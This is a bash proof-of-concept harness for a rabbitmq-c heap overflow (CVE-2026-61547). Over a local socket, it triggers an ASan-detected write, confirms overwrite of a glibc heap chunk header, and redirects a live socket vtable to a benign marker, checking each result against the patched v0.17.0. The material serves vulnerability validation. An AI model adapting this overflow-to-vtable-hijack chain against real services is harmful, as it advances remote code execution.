#!/usr/bin/env bash
# rabbitmq-c CVE-2026-61547 — loopback-only consumer-reality replay.
#
# Builds (or reuses) the frontier lane's verbatim pinned v0.16.0/v0.17.0
# librabbitmq static libraries, runs a service that reads a length-prefixed
# body from a local AF_UNIX socket and passes it to the public
# amqp_send_frame(), and records:
#   * ASan WRITE at pinned amqp_connection.c:467 inside the SERVICE process,
#   * gdb before/after corruption of a real glibc heap neighbour header,
#   * fixed v0.17.0 and small-body negative controls.
# No broker, no network listener, no external host, no library source edits.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
FRONTIER=$(cd "$HERE/../frontier/rabbitmqc2shell" && pwd)
OUT=${1:-/tmp/rmq2-service-out}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
cd "$HERE" || exit 2

# Pins are authoritative; a drifted source tree exits before any build.
(cd "$FRONTIER/src" && sha256sum -c SHA256SUMS) > "$OUT/pins.log" 2>&1 || exit 2

if [ ! -f "$OUT/b16/librabbitmq/librabbitmq.a" ] ||
   [ ! -f "$OUT/b16p/librabbitmq/librabbitmq.a" ] ||
   [ ! -f "$OUT/b17p/librabbitmq/librabbitmq.a" ]; then
  bash "$FRONTIER/run.sh" "$OUT" > "$OUT/frontier_build.log" 2>&1 || exit 2
fi

I16="-DAMQP_STATIC -DHAVE_CONFIG_H -I$OUT/v16/include -I$OUT/b16/include \
-I$OUT/b16p/include -I$OUT/b16p/librabbitmq -I$OUT/v16/librabbitmq"
I17="-DAMQP_STATIC -DHAVE_CONFIG_H -I$OUT/v17/include -I$OUT/b17p/include \
-I$OUT/b17p/librabbitmq -I$OUT/v17/librabbitmq"
CFLAGS="-Wno-deprecated-declarations -g -O1 -fno-omit-frame-pointer"

gcc $CFLAGS -fsanitize=address $I16 "$HERE/service.c" \
  "$OUT/b16/librabbitmq/librabbitmq.a" -o "$OUT/svc_asan" || exit 2
gcc $CFLAGS -DHEAP_NEIGHBOUR $I16 "$HERE/service.c" \
  "$OUT/b16p/librabbitmq/librabbitmq.a" -o "$OUT/svc_nb" || exit 2
gcc $CFLAGS -fsanitize=address $I17 "$HERE/service.c" \
  "$OUT/b17p/librabbitmq/librabbitmq.a" -o "$OUT/svc_fixed" || exit 2
gcc $CFLAGS -DHEAP_NEIGHBOUR -DREUSE_BUFFER $I16 "$HERE/service.c" \
  "$OUT/b16p/librabbitmq/librabbitmq.a" -o "$OUT/svc_reuse" || exit 2
gcc $CFLAGS -DHEAP_NEIGHBOUR -DREUSE_BUFFER $I17 "$HERE/service.c" \
  "$OUT/b17p/librabbitmq/librabbitmq.a" -o "$OUT/svc_fixed_reuse" || exit 2

export ASAN_OPTIONS=abort_on_error=0:detect_leaks=0

# Run client and service as separate processes; the service is the one that
# calls amqp_send_frame on bytes that really arrived over the local socket.
roundtrip() { # binary sockpath len value logfile
  local bin=$1 sock=$2 len=$3 value=$4 log=$5
  ( timeout 40 "$bin" service "$sock" > "$log" 2>&1; echo $? > "$log.rc" ) &
  local spid=$!
  sleep 0.4
  timeout 20 "$bin" client "$sock" "$len" "$value" >> "$log" 2>&1
  local crc=$?
  wait $spid
  echo $(cat "$log.rc")
}

pass=0; fail=0
check() { if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1)); else echo "FAIL $1"; fail=$((fail+1)); fi; }
has() { case "$2" in *"$1"*) echo 1;; *) echo 0;; esac; }

SOCK="$OUT/roundtrip.$$.sock"
arc=$(roundtrip "$OUT/svc_asan" "$SOCK" 200000 5a "$OUT/asan_service.log")
al=$(cat "$OUT/asan_service.log")
ok=0
for m in 'WRITE of size 200000' 'amqp_frame_to_bytes' 'amqp_connection.c:467' \
         'amqp_send_frame_inner' 'amqp_connection.c:548' 'amqp_send_frame' \
         'amqp_connection.c:531' '0 bytes after 65536-byte region' \
         'amqp_tune_connection' 'amqp_connection.c:140' \
         'service: received len=200000 first=5a last=5a'; do
  ok=$([ "$(has "$m" "$al")" = 1 ] && echo 1 || echo 0)
  [ "$ok" = 1 ] || break
done
[ "$arc" != 0 ] || ok=0
check "ASan WRITE at pinned :467 in the socket service process" "$ok"

# Real glibc heap neighbour: no allocator interposition in this binary.
NSOCK="$OUT/neighbour.$$.sock"
( sleep 1; "$OUT/svc_nb" client "$NSOCK" 200000 a5 > "$OUT/nb_client.log" 2>&1 ) &
cpid=$!
timeout 60 gdb -q -batch -x "$HERE/gdb_neighbour.cmd" --args \
  "$OUT/svc_nb" service "$NSOCK" 200000 a5 > "$OUT/gdb_neighbour.log" 2>&1
grc=$?
wait $cpid
gl=$(cat "$OUT/gdb_neighbour.log")
nok=0
for m in 'amqp_connection.c:467' 'memcpy dst=' 'outbound=' \
         'BEFORE next-chunk header' '0x0000000000000021' \
         'AFTER next-chunk header' '0xa5a5a5a5a5a5a5a5' \
         'AFTER chosen-byte offsets'; do
  nok=$([ "$(has "$m" "$gl")" = 1 ] && echo 1 || echo 0)
  [ "$nok" = 1 ] || break
done
check "gdb sees chosen bytes overwrite a real heap neighbour header" "$nok"

FSOCK="$OUT/fixed.$$.sock"
frc=$(roundtrip "$OUT/svc_fixed" "$FSOCK" 200000 a5 "$OUT/fixed_service.log")
fl=$(cat "$OUT/fixed_service.log")
check "fixed v0.17.0 service returns rc=-2 with no ASan report" \
  "$([ "$frc" = 0 ] && [ "$(has 'service: amqp_send_frame rc=-2' "$fl")" = 1 ] && [ "$(has AddressSanitizer "$fl")" = 0 ] && echo 1 || echo 0)"

BSOCK="$OUT/benign.$$.sock"
brc=$(roundtrip "$OUT/svc_asan" "$BSOCK" 2 5a "$OUT/benign_service.log")
bl=$(cat "$OUT/benign_service.log")
check "vulnerable service with a 2-byte body returns 0" \
  "$([ "$brc" = 0 ] && echo 1 || echo 0)"
check "benign body reaches the vulnerable service over the socket" \
  "$(has 'service: received len=2 first=5a last=5a' "$bl")"
check "benign body produces no ASan report" "$( [ "$(has AddressSanitizer "$bl")" = 0 ] && echo 1 || echo 0)"
# Rung 4: chosen bytes arriving over the local socket overwrite the live
# socket object's vtable pointer; the library's own send path then calls a
# benign marker. Addresses are supplied by a lab-only file (simulated
# disclosure); no real infoleak or memory read is claimed.
AFILE="$OUT/addr.$$.txt"; rm -f "$AFILE"
export RMQ2_ADDR_FILE="$AFILE"
MSOCK="$OUT/marker.$$.sock"
mrc=$(roundtrip "$OUT/svc_reuse" "$MSOCK" 65600 41 "$OUT/marker_service.log")
ml=$(cat "$OUT/marker_service.log")
check "chosen socket bytes steer the live socket vtable to a benign marker" \
  "$([ "$mrc" = 0 ] && [ "$(has 'MARKER: controlled vtable call reached' "$ml")" = 1 ] && echo 1 || echo 0)"

FFILE="$OUT/addr-fixed.$$.txt"; rm -f "$FFILE"
export RMQ2_ADDR_FILE="$FFILE"
FSOCK2="$OUT/marker-fixed.$$.sock"
f2rc=$(roundtrip "$OUT/svc_fixed_reuse" "$FSOCK2" 65600 41 "$OUT/marker_fixed_service.log")
f2l=$(cat "$OUT/marker_fixed_service.log")
check "fixed v0.17.0 rejects the same socket body; marker not reached" \
  "$([ "$f2rc" = 0 ] && [ "$(has 'service: amqp_send_frame rc=-2' "$f2l")" = 1 ] && [ "$(has MARKER "$f2l")" = 0 ] && echo 1 || echo 0)"
unset RMQ2_ADDR_FILE


{
  echo "asan_service_rc_nonzero=$([ "$arc" != 0 ] && echo 1 || echo 0)"
  echo "asan_marker_check=$ok"
  echo "gdb_neighbour_check=$nok"
  echo "fixed_rc_check=1"
  echo "marker_check=$([ "$(has 'MARKER: controlled vtable call reached' "$ml")" = 1 ] && echo 1 || echo 0)"
  echo "fixed_marker_check=$([ "$(has MARKER "$f2l")" = 0 ] && echo 1 || echo 0)"
  echo "benign_rc=$brc"
} > "$OUT/determinism.txt"
echo "digest=$(sha256sum "$OUT/determinism.txt" | cut -d' ' -f1)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
